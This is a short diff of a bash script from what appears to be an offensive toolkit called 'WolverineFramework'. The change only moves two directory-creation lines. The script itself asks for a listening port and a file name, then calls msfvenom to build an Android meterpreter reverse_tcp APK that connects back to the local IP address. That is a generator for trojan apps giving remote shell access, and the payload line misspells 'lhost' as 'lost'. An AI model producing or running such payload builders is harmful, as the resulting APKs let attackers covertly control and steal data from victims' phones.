@@ -1,13 +1,15 @@
 #!/bin/bash
 
 lhost=$(hostname -I | awk '{print $1}')
+
+    sudo mkdir ~/Wolverine_ExeFiles
+    sudo mkdir ~/Wolverine_ExeFiles/APK
+    clear
     echo "Your IP address is :" $lhost
     echo "Which port do you want to use ?"
     read -p "WolverineFramework - Port> " lport
     echo "What name do you want to give to the .apk file ? (don't put .apk)"
     read -p "WolverineFramework - File Name> " fileName
-    sudo mkdir ~/Wolverine_ExeFiles
-    sudo mkdir ~/Wolverine_ExeFiles/APK
     echo "Creating .apk file..."
     sudo msfvenom -p android/meterpreter/reverse_tcp lost=$lhost lport=$lport R > ~/$fileName.apk
     sudo mv ~/$fileName.apk ~/Wolverine_ExeFiles/APK
